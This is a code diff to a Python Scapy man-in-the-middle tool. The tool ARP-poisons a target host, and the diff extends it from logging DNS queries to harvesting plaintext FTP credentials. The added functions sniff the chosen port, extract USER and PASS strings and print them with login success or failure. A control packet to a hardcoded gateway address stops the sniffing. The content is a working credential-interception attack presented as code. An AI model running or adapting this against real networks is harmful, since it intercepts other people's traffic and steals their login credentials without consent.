@@ -43,8 +43,12 @@ def _restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
          count=10)
     menu_utils.highlighted_info("Disabling IP forwarding")
 
-    flag_pkt = IP(src=target_ip, dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='flag.flag'))    # flag packet to
-    send(flag_pkt, verbose=0)                                                                     # trigger stop_filter
+    if plain_ports is None:
+        flag_pkt = IP(src=target_ip, dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='flag.flag'))
+    else:
+        flag_pkt = IP(src=target_ip, dst="192.168.1.1") / TCP(dport=plain_ports[0]) / "flag.flag"
+
+    send(flag_pkt, verbose=0)                                               # flag packet to trigger stop_filter
 
     # Disable IP Forwarding on a mac
     os.system("sysctl -w net.inet.ip.forwarding=0")
@@ -65,12 +69,38 @@ def _target_dns_sniffer(pkt):
                 domain_list[domain] += 1
 
 
+def _target_passwd_sniffer(pkt):
+
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        if pkt[TCP].dport == plain_ports[0] or pkt[TCP].sport == plain_ports[0]:
+            data = str(pkt[Raw])
+            if 'USER' in data and '530' not in data:
+                ftp_user = data.split('USER')[1][:-5]   # [:-5] to remove \r\n' from the user
+                print("%s -> %s: FTP user: %s" % (pkt[IP].src, pkt[IP].dst, ftp_user))
+            elif 'PASS' in data and '530' not in data:
+                ftp_pass = data.split('PASS')[1][:-5]   # [:-5] to remove \r\n' from the password
+                print("%s -> %s: FTP pass: %s" % (pkt[IP].src, pkt[IP].dst, ftp_pass))
+            elif '230 Login successful' in data:
+                menu_utils.super_highlighted_info("%s -> %s: FTP login successful" % (pkt[IP].src, pkt[IP].dst))
+            elif '530 Login incorrect' in data:
+                menu_utils.warning("%s -> %s: FTP login incorrect" % (pkt[IP].src, pkt[IP].dst))
+
+
 def _stop_dns_sniffer(pkt):  # this will stop the sniffer
 
     if 'DNS' in pkt:
         if pkt[IP].dst == "8.8.8.8":
             if (pkt[DNS].rd == 1) & ("flag.flag" in str(pkt[DNS].qd.qname)):
                 return True
+
+    return False
+
+
+def _stop_passwd_sniffer(pkt):  # this will stop the sniffer
+
+    if (pkt[IP].src == t_ip) & (pkt[IP].dst == "192.168.1.1"):
+        if "flag.flag" in str(pkt[TCP]):
+            return True
 
     return False
 
@@ -92,15 +122,16 @@ def _main_keyboard_interrupt_handler(signal, frame):
     menu_utils.see_you_soon()
 
 
-def mitm_attack(network_iface, target_ip, gateway_ip):
+def mitm_attack(network_iface, target_ip, gateway_ip, ports=None):
 
-    global h_mac, t_ip, g_ip, t_mac, g_mac, continue_poison, domain_list, poison_thread
+    global h_mac, t_ip, g_ip, t_mac, g_mac, continue_poison, domain_list, poison_thread, plain_ports
     h_mac = get_if_hwaddr(network_iface)
     t_ip = target_ip
     g_ip = gateway_ip
     g_mac = "not-valid"
     domain_list = {}
     continue_poison = True
+    plain_ports = ports
 
     signal.signal(signal.SIGINT, _keyboard_interrupt_handler)
 
@@ -133,9 +164,18 @@ def mitm_attack(network_iface, target_ip, gateway_ip):
     poison_thread = threading.Thread(target=_arp_poison, args=(g_ip, g_mac, t_ip, t_mac))
     poison_thread.start()
 
-    # Sniff DNS traffic
-    bpf_filter = f"udp port 53 and ip src {target_ip}"
-    menu_utils.header("Stage 2: Eavesdropping target DNS traffic")
-    sniff(iface=network_iface, filter=bpf_filter, prn=_target_dns_sniffer, stop_filter=_stop_dns_sniffer, store=0)
+    if not ports:
+        # Sniff DNS traffic
+        bpf_dns_filter = f"udp port 53 and ip src {target_ip}"
+        menu_utils.header("Stage 2: Eavesdropping target DNS traffic")
+        sniff(iface=network_iface, filter=bpf_dns_filter,
+              prn=_target_dns_sniffer, stop_filter=_stop_dns_sniffer, store=0)
+
+    else:
+        # Sniff passwords
+        bpf_ftp_filter = f"tcp port {plain_ports[0]} and (ip src {target_ip} or ip dst {target_ip})"
+        menu_utils.header("Stage 2: Eavesdropping FTP plain passwords")
+        sniff(iface=network_iface, filter=bpf_ftp_filter,
+              prn=_target_passwd_sniffer, stop_filter=_stop_passwd_sniffer, store=0)
 
     signal.signal(signal.SIGINT, _main_keyboard_interrupt_handler)
